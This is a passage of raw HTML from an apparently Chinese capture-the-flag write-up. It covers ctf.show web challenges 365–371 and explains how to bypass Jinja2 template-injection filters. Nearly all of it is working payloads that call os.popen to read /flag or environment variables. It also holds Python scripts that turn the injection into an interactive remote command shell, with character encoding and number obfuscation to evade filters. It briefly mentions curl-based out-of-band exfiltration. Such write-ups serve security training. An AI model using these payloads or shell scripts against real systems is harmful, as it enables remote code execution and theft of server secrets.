punctuation">.</span>cookies<span class="token punctuation">.</span>c<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>a<span class="token operator">=</span>os<span class="token punctuation">;</span>b<span class="token operator">=</span>popen<span class="token punctuation">;</span>c<span class="token operator">=</span>cat <span class="token operator">/</span>flag</code></pre><p><a href="https://blog.csdn.net/miuzzx/article/details/110220425">SSTI模板注入绕过（进阶篇）</a></p><h4 id="web365-过滤"><a href="#web365-过滤" class="headerlink" title="web365(过滤[])"></a>web365(过滤[])</h4><p>fuzz 字典跑一遍，发现单双引号、args、[]被过滤</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># GET传参</span>?name<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>lipsum<span class="token punctuation">.</span>__globals__<span class="token punctuation">.</span>os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span>request<span class="token punctuation">.</span>values<span class="token punctuation">.</span>a<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token operator">&amp;</span>a<span class="token operator">=</span>tac <span class="token operator">/</span>flag<span class="token comment"># cookie</span>?name<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">.</span>os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span>request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>c<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>Cookie<span class="token punctuation">:</span>c<span class="token operator">=</span>cat <span class="token operator">/</span>flag<span class="token comment"># __getitem__ 可以代替方括号</span>?name<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>g<span class="token punctuation">.</span>pop<span class="token punctuation">.</span>__globals__<span class="token punctuation">.</span>__builtins__<span class="token punctuation">.</span>__getitem__<span class="token punctuation">(</span>request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>x<span class="token punctuation">)</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>xx<span class="token punctuation">)</span><span class="token punctuation">.</span>popen<span class="token punctuation">(</span>request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>xxx<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>Cookie<span class="token punctuation">:</span> x<span class="token operator">=</span><span class="token builtin">__import__</span><span class="token punctuation">;</span>xx<span class="token operator">=</span>os<span class="token punctuation">;</span>xxx<span class="token operator">=</span>env</code></pre><h4 id="web366-过滤-attr"><a href="#web366-过滤-attr" class="headerlink" title="web366(过滤__  attr)"></a>web366(过滤__  attr)</h4><p>过滤了<code>_</code> <code>&#39;</code> <code>&quot;</code> <code>[</code>      <code>|attr</code> 可代替 <code>.</code></p><p>Payload:</p><pre class="language-python" data-language="python"><code class="language-python">?name<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token punctuation">(</span>lipsum<span class="token operator">|</span>attr<span class="token punctuation">(</span>request<span class="token punctuation">.</span>values<span class="token punctuation">.</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span>request<span class="token punctuation">.</span>values<span class="token punctuation">.</span>b<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token operator">&amp;</span>a<span class="token operator">=</span>__globals__<span class="token operator">&amp;</span>b<span class="token operator">=</span>tac <span class="token operator">/</span>flag</code></pre><h4 id="web367-过滤os"><a href="#web367-过滤os" class="headerlink" title="web367(过滤os)"></a>web367(过滤os)</h4><p>Payload:</p><pre class="language-python" data-language="python"><code class="language-python">?name<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token punctuation">(</span>lipsum<span class="token operator">|</span>attr<span class="token punctuation">(</span>request<span class="token punctuation">.</span>values<span class="token punctuation">.</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>get<span class="token punctuation">(</span>request<span class="token punctuation">.</span>values<span class="token punctuation">.</span>b<span class="token punctuation">)</span><span class="token punctuation">.</span>popen<span class="token punctuation">(</span>request<span class="token punctuation">.</span>values<span class="token punctuation">.</span>c<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token operator">&amp;</span>a<span class="token operator">=</span>__globals__<span class="token operator">&amp;</span>b<span class="token operator">=</span>os<span class="token operator">&amp;</span>c<span class="token operator">=</span>cat <span class="token operator">/</span>flag?name<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>lipsum<span class="token operator">|</span>attr<span class="token punctuation">(</span>request<span class="token punctuation">.</span>values<span class="token punctuation">.</span>a<span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span>request<span class="token punctuation">.</span>values<span class="token punctuation">.</span>b<span class="token punctuation">)</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>values<span class="token punctuation">.</span>c<span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span>request<span class="token punctuation">.</span>values<span class="token punctuation">.</span>d<span class="token punctuation">)</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>values<span class="token punctuation">.</span>ocean<span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span>request<span class="token punctuation">.</span>values<span class="token punctuation">.</span>f<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token operator">&amp;</span>ocean<span class="token operator">=</span>cat <span class="token operator">/</span>flag<span class="token operator">&amp;</span>a<span class="token operator">=</span>__globals__<span class="token operator">&amp;</span>b<span class="token operator">=</span>__getitem__<span class="token operator">&amp;</span>c<span class="token operator">=</span>os<span class="token operator">&amp;</span>d<span class="token operator">=</span>popen<span class="token operator">&amp;</span>f<span class="token operator">=</span>read</code></pre><h4 id="web368-过滤双"><a href="#web368-过滤双" class="headerlink" title="web368(过滤双{)"></a>web368(过滤双{)</h4><p>可用 <code>&#123;%print(payload)%&#125;</code> 代替 <code>&#123;&#123;payload&#125;&#125;</code></p><pre class="language-python" data-language="python"><code class="language-python">?name<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">(</span>lipsum<span class="token operator">|</span>attr<span class="token punctuation">(</span>request<span class="token punctuation">.</span>values<span class="token punctuation">.</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>get<span class="token punctuation">(</span>request<span class="token punctuation">.</span>values<span class="token punctuation">.</span>b<span class="token punctuation">)</span><span class="token punctuation">.</span>popen<span class="token punctuation">(</span>request<span class="token punctuation">.</span>values<span class="token punctuation">.</span>c<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span><span class="token operator">&amp;</span>a<span class="token operator">=</span>__globals__<span class="token operator">&amp;</span>b<span class="token operator">=</span>os<span class="token operator">&amp;</span>c<span class="token operator">=</span>tac <span class="token operator">/</span>flag</code></pre><h4 id="web369-过滤request"><a href="#web369-过滤request" class="headerlink" title="web369(过滤request)"></a>web369(过滤request)</h4><p>没了 request，要自己拼字符了。</p><p><a href="https://jinja.palletsprojects.com/en/3.1.x/templates/#builtin-filters">List of Builtin Filters</a></p><pre class="language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> pop<span class="token operator">=</span><span class="token builtin">dict</span><span class="token punctuation">(</span>p<span class="token operator">=</span>a<span class="token punctuation">,</span>op<span class="token operator">=</span>a<span class="token punctuation">)</span><span class="token operator">|</span>join <span class="token operator">%</span><span class="token punctuation">&#125;</span> <span class="token comment">#pop</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> lo<span class="token operator">=</span><span class="token punctuation">(</span>x<span class="token operator">|</span>reject<span class="token operator">|</span>string<span class="token operator">|</span><span class="token builtin">list</span><span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span>pop<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">24</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token punctuation">&#125;</span> <span class="token comment">#_</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> c1<span class="token operator">=</span><span class="token punctuation">(</span>lo<span class="token punctuation">,</span>lo<span class="token punctuation">,</span><span class="token builtin">dict</span><span class="token punctuation">(</span>ini<span class="token operator">=</span>a<span class="token punctuation">,</span>t<span class="token operator">=</span>a<span class="token punctuation">)</span><span class="token operator">|</span>join<span class="token punctuation">,</span>lo<span class="token punctuation">,</span>lo<span class="token punctuation">)</span><span class="token operator">|</span>join <span class="token operator">%</span><span class="token punctuation">&#125;</span> <span class="token comment">#__init__</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> c2<span class="token operator">=</span><span class="token punctuation">(</span>lo<span class="token punctuation">,</span>lo<span class="token punctuation">,</span><span class="token builtin">dict</span><span class="token punctuation">(</span>glo<span class="token operator">=</span>a<span class="token punctuation">,</span>bals<span class="token operator">=</span>a<span class="token punctuation">)</span><span class="token operator">|</span>join<span class="token punctuation">,</span>lo<span class="token punctuation">,</span>lo<span class="token punctuation">)</span><span class="token operator">|</span>join <span class="token operator">%</span><span class="token punctuation">&#125;</span> <span class="token comment">#__globals__</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> c3<span class="token operator">=</span><span class="token punctuation">(</span>lo<span class="token punctuation">,</span>lo<span class="token punctuation">,</span><span class="token builtin">dict</span><span class="token punctuation">(</span>get<span class="token operator">=</span>a<span class="token punctuation">,</span>item<span class="token operator">=</span>a<span class="token punctuation">)</span><span class="token operator">|</span>join<span class="token punctuation">,</span>lo<span class="token punctuation">,</span>lo<span class="token punctuation">)</span><span class="token operator">|</span>join <span class="token operator">%</span><span class="token punctuation">&#125;</span> <span class="token comment">#__getitem__</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> c4<span class="token operator">=</span><span class="token punctuation">(</span>lo<span class="token punctuation">,</span>lo<span class="token punctuation">,</span><span class="token builtin">dict</span><span class="token punctuation">(</span>buil<span class="token operator">=</span>a<span class="token punctuation">,</span>tins<span class="token operator">=</span>a<span class="token punctuation">)</span><span class="token operator">|</span>join<span class="token punctuation">,</span>lo<span class="token punctuation">,</span>lo<span class="token punctuation">)</span><span class="token operator">|</span>join <span class="token operator">%</span><span class="token punctuation">&#125;</span> <span class="token comment">#__builtins__</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> c5<span class="token operator">=</span><span class="token builtin">dict</span><span class="token punctuation">(</span>ev<span class="token operator">=</span>a<span class="token punctuation">,</span>al<span class="token operator">=</span>a<span class="token punctuation">)</span><span class="token operator">|</span>join <span class="token operator">%</span><span class="token punctuation">&#125;</span> <span class="token comment">#eval</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> sc<span class="token operator">=</span>a<span class="token operator">|</span>pprint<span class="token operator">|</span>pprint<span class="token operator">|</span><span class="token builtin">list</span><span class="token operator">|</span>attr<span class="token punctuation">(</span>pop<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span> <span class="token comment">#'   pprint filter 在字符串上会加上单引号</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> lb<span class="token operator">=</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">|</span>string<span class="token operator">|</span><span class="token builtin">list</span><span class="token operator">|</span>attr<span class="token punctuation">(</span>pop<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token punctuation">&#125;</span> <span class="token comment">#(</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> rb<span class="token operator">=</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">|</span>string<span class="token operator">|</span><span class="token builtin">list</span><span class="token operator">|</span>attr<span class="token punctuation">(</span>pop<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span> <span class="token comment">#)</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> point<span class="token operator">=</span><span class="token number">3.14</span><span class="token operator">|</span>string<span class="token operator">|</span><span class="token builtin">list</span><span class="token operator">|</span>attr<span class="token punctuation">(</span>pop<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span> <span class="token comment">#.</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> x<span class="token operator">=</span><span class="token punctuation">(</span>lo<span class="token punctuation">,</span>lo<span class="token punctuation">,</span><span class="token builtin">dict</span><span class="token punctuation">(</span>imp<span class="token operator">=</span>a<span class="token punctuation">,</span>ort<span class="token operator">=</span>a<span class="token punctuation">)</span><span class="token operator">|</span>join<span class="token punctuation">,</span>lo<span class="token punctuation">,</span>lo<span class="token punctuation">,</span>lb<span class="token punctuation">,</span>sc<span class="token punctuation">,</span><span class="token builtin">dict</span><span class="token punctuation">(</span>o<span class="token operator">=</span>a<span class="token punctuation">,</span>s<span class="token operator">=</span>a<span class="token punctuation">)</span><span class="token operator">|</span>join<span class="token punctuation">,</span>sc<span class="token punctuation">,</span>rb<span class="token punctuation">,</span>point<span class="token punctuation">,</span><span class="token builtin">dict</span><span class="token punctuation">(</span>po<span class="token operator">=</span>a<span class="token punctuation">,</span>pen<span class="token operator">=</span>a<span class="token punctuation">)</span><span class="token operator">|</span>join<span class="token punctuation">,</span>lb<span class="token punctuation">,</span>sc<span class="token punctuation">,</span><span class="token builtin">dict</span><span class="token punctuation">(</span>en<span class="token operator">=</span>a<span class="token punctuation">,</span>v<span class="token operator">=</span>a<span class="token punctuation">)</span><span class="token operator">|</span>join<span class="token punctuation">,</span>sc<span class="token punctuation">,</span>rb<span class="token punctuation">,</span>point<span class="token punctuation">,</span><span class="token builtin">dict</span><span class="token punctuation">(</span>rea<span class="token operator">=</span>a<span class="token punctuation">,</span>d<span class="token operator">=</span>a<span class="token punctuation">)</span><span class="token operator">|</span>join<span class="token punctuation">,</span>lb<span class="token punctuation">,</span>rb<span class="token punctuation">)</span><span class="token operator">|</span>join <span class="token operator">%</span><span class="token punctuation">&#125;</span> <span class="token comment"># __import__('os').popen('env').read()</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token operator">|</span>attr<span class="token punctuation">(</span>c1<span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span>c2<span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span>c3<span class="token punctuation">)</span><span class="token punctuation">(</span>c4<span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span>c3<span class="token punctuation">)</span><span class="token punctuation">(</span>c5<span class="token punctuation">)</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span> <span class="token comment">#print(a.__init__.__globals__.__getitem__("__builtins__").__getitem__("eval")("__import__('os').popen('env').read()"))</span></code></pre><pre class="language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> pop<span class="token operator">=</span><span class="token builtin">dict</span><span class="token punctuation">(</span>p<span class="token operator">=</span>a<span class="token punctuation">,</span>op<span class="token operator">=</span>a<span class="token punctuation">)</span><span class="token operator">|</span>join <span class="token operator">%</span><span class="token punctuation">&#125;</span> <span class="token comment">#pop </span></code></pre><ul><li>这行代码使用Jinja2的模板语法，通过字典和join过滤器构造了一个字符串 “pop”。<code>dict(p=a, op=a)</code> 创建了一个包含键值对 <code>&#123;&#39;p&#39;: a, &#39;op&#39;: a&#125;</code> 的字典，然后 <code>|join</code> 将这些键连接成字符串 “pop”。</li></ul><p>其他相似原理</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> re<span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://106261e2-bcd9-4731-a15e-35ac39f86511.challenge.ctf.show/?name="</span><span class="token keyword">def</span> <span class="token function">build_payload</span><span class="token punctuation">(</span>command<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">str</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token triple-quoted-string string">"""&#123;% set pops=dict(p=a,op=a)|join %&#125;&#123;% set lo=(x|reject|string|list)|attr(pops)(24)%&#125;&#123;% set init=(lo,lo,dict(ini=a,t=a)|join,lo,lo)|join %&#125;&#123;% set c2=(lo,lo,dict(glo=a,bals=a)|join,lo,lo)|join %&#125;&#123;% set c3=(lo,lo,dict(get=a,item=a)|join,lo,lo)|join %&#125;&#123;% set c4=(lo,lo,dict(buil=a,tins=a)|join,lo,lo)|join %&#125;&#123;% set evas=dict(ev=a,al=a)|join %&#125;&#123;% set chs=dict(ch=a,r=a)|join %&#125;&#123;% set chr=a|attr(init)|attr(c2)|attr(c3)(c4)|attr(c3)(chs)%&#125;&#123;% set eval=a|attr(init)|attr(c2)|attr(c3)(c4)|attr(c3)(evas) %&#125;&#123;% print(eval(("""</span> <span class="token operator">+</span> <span class="token string">","</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string-interpolation"><span class="token string">f"chr(</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">ord</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">)"</span></span> <span class="token keyword">for</span> c <span class="token keyword">in</span> <span class="token string-interpolation"><span class="token string">f"__import__('os').popen('</span><span class="token interpolation"><span class="token punctuation">&#123;</span>command<span class="token punctuation">&#125;</span></span><span class="token string">').read()"</span></span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token triple-quoted-string string">""")|join)) %&#125;"""</span><span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>command<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">str</span><span class="token punctuation">:</span>    response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">+</span>build_payload<span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"h3>(.*?)&lt;/h3"</span></span><span class="token punctuation">,</span> response<span class="token punctuation">.</span>text<span class="token punctuation">,</span> re<span class="token punctuation">.</span>S<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    c <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>run<span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><h4 id="web370-过滤了数字"><a href="#web370-过滤了数字" class="headerlink" title="web370(过滤了数字)"></a>web370(过滤了数字)</h4><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> re<span class="token keyword">from</span> typing <span class="token keyword">import</span> List<span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://717d6b1c-8b55-4083-b8af-52d9b0fd1eab.challenge.ctf.show/"</span><span class="token keyword">def</span> <span class="token function">build_number</span><span class="token punctuation">(</span>num<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">str</span><span class="token punctuation">:</span>    result<span class="token punctuation">:</span> List<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    index<span class="token punctuation">:</span> <span class="token builtin">int</span> <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">while</span> num <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span>        n<span class="token punctuation">:</span> <span class="token builtin">int</span> <span class="token operator">=</span> num <span class="token operator">%</span> <span class="token number">10</span>        result<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"(</span><span class="token interpolation"><span class="token punctuation">&#123;</span>num2var<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token string">'*ten'</span><span class="token operator">*</span>index<span class="token punctuation">&#125;</span></span><span class="token string">)"</span></span><span class="token punctuation">)</span>        num <span class="token operator">//=</span> <span class="token number">10</span>        index <span class="token operator">+=</span> <span class="token number">1</span>    <span class="token keyword">return</span> <span class="token string">"+"</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>result<span class="token punctuation">)</span>num2var_dict <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token number">0</span><span class="token punctuation">:</span> <span class="token string">"zero"</span><span class="token punctuation">,</span>    <span class="token number">1</span><span class="token punctuation">:</span> <span class="token string">"one"</span><span class="token punctuation">,</span>    <span class="token number">2</span><span class="token punctuation">:</span> <span class="token string">"two"</span><span class="token punctuation">,</span>    <span class="token number">3</span><span class="token punctuation">:</span> <span class="token string">"three"</span><span class="token punctuation">,</span>    <span class="token number">4</span><span class="token punctuation">:</span> <span class="token string">"four"</span><span class="token punctuation">,</span>    <span class="token number">5</span><span class="token punctuation">:</span> <span class="token string">"five"</span><span class="token punctuation">,</span>    <span class="token number">6</span><span class="token punctuation">:</span> <span class="token string">"six"</span><span class="token punctuation">,</span>    <span class="token number">7</span><span class="token punctuation">:</span> <span class="token string">"seven"</span><span class="token punctuation">,</span>    <span class="token number">8</span><span class="token punctuation">:</span> <span class="token string">"eight"</span><span class="token punctuation">,</span>    <span class="token number">9</span><span class="token punctuation">:</span> <span class="token string">"nine"</span><span class="token punctuation">&#125;</span><span class="token keyword">def</span> <span class="token function">num2var</span><span class="token punctuation">(</span>num<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">str</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token builtin">abs</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">10</span><span class="token punctuation">:</span>        <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"no way"</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> num2var_dict<span class="token punctuation">[</span>num<span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">build_payload</span><span class="token punctuation">(</span>command<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">str</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token triple-quoted-string string">"""&#123;% set one=(a,)|length %&#125;&#123;% set zero=one-one %&#125;&#123;% set two=one+one %&#125;&#123;% set three=one+two %&#125;&#123;% set four=two*two %&#125;&#123;% set five=three+two %&#125;&#123;% set six=three*two %&#125;&#123;% set seven=one+six %&#125;&#123;% set eight=four*two %&#125;&#123;% set nine=one+eight %&#125;&#123;% set ten=five*two %&#125;&#123;% set pops=dict(p=a,op=a)|join %&#125;&#123;% set lo=(x|reject|string|list)|attr(pops)("""</span> <span class="token operator">+</span> build_number<span class="token punctuation">(</span><span class="token number">24</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token triple-quoted-string string">""")%&#125;&#123;% set init=(lo,lo,dict(ini=a,t=a)|join,lo,lo)|join %&#125;&#123;% set cc=(lo,lo,dict(glo=a,bals=a)|join,lo,lo)|join %&#125;&#123;% set ccc=(lo,lo,dict(get=a,item=a)|join,lo,lo)|join %&#125;&#123;% set cccc=(lo,lo,dict(buil=a,tins=a)|join,lo,lo)|join %&#125;&#123;% set evas=dict(ev=a,al=a)|join %&#125;&#123;% set chs=dict(ch=a,r=a)|join %&#125;&#123;% set chr=a|attr(init)|attr(cc)|attr(ccc)(cccc)|attr(ccc)(chs)%&#125;&#123;% set eval=a|attr(init)|attr(cc)|attr(ccc)(cccc)|attr(ccc)(evas) %&#125;&#123;% print(eval(("""</span> <span class="token operator">+</span> <span class="token string">","</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string-interpolation"><span class="token string">f"chr(</span><span class="token interpolation"><span class="token punctuation">&#123;</span>build_number<span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">)"</span></span> <span class="token keyword">for</span> c <span class="token keyword">in</span> <span class="token string-interpolation"><span class="token string">f"__import__('os').popen('</span><span class="token interpolation"><span class="token punctuation">&#123;</span>command<span class="token punctuation">&#125;</span></span><span class="token string">').read()"</span></span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token triple-quoted-string string">""")|join)) %&#125;"""</span><span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>command<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">str</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> build_payload<span class="token punctuation">(</span>command<span class="token punctuation">)</span>    response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> params<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"name"</span><span class="token punctuation">:</span> payload<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token comment"># print(payload)</span>    <span class="token keyword">return</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"h3>(.*?)&lt;/h3"</span></span><span class="token punctuation">,</span> response<span class="token punctuation">.</span>text<span class="token punctuation">,</span> re<span class="token punctuation">.</span>S<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    c <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>run<span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><h4 id="web371-372-无回显"><a href="#web371-372-无回显" class="headerlink" title="web371-372(无回显)"></a>web371-372(无回显)</h4><p>371不给 print，curl 带外</p><p>372过滤count，但是不影响</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> re<span class="token keyword">from</span> typing <span class="token keyword">import</span> List<span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://39ebd089-1562-497f-bff2-83664f8ae528.challenge.ctf.show/"</span><span class="token keyword">def</span> <span class="token function">build_number</span><span class="token punctuation">(</span>num<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">str</span><span class="token punctuation">:</span>    result<span class="token punctuation">:</span> List<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    index<span class="token punctuation">:</span> <span class="token builtin">int</span> <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">while</span> num <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span>        n<span class="token punctuation">:</span> <span class="token builtin">int</span> <span class="token operator">=</span> num <span class="token operator">%</span> <span class="token number">10</span>        result<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"(</span><span class="token interpolation"><span class="token punctuation">&#123;</span>num2var<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token string">'*ten'</span><span class="token operator">*</span>index<span class="token punctuation">&#125;</span></span><span class="token string">)"</span></span><span class="token 